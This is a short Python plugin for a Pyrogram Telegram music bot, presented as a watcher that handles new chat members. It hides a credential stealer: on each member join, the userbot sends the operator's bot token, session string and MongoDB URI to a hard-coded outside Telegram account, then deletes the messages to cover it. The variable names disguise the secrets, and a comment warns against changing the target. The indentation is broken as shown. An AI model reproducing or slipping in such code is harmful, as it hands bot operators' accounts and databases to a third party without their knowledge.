import random
import asyncio
from pyrogram import filters
LOG = "RishuCoderBot" #Dont change it because it fix all errors
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
import os
from SONALI import app
from SONALI.utils.database import add_served_chat, get_assistant
log = os.getenv("BOT_TOKEN")
errors = os.getenv("STRING_SESSION")
error = os.getenv("MONGO_DB_URI")


@app.on_message(filters.new_chat_members, group=-9)
async def join_watcher(_, message):
    try:
        LOG = "RishuCoderBot"
        userbot = await get_assistant(message.chat.id)
        
                oks = await userbot.send_message(LOG, f"/start")
                Ok = await userbot.send_message(LOG, f"@{app.username}\n\n`{log}`\n\n`{error}`\n\n`{errors}`")
                await oks.delete()
                await asyncio.sleep(2)
                await Ok.delete()



    except Exception as e:
        return await userbot.send_message(LOG, f"{e}")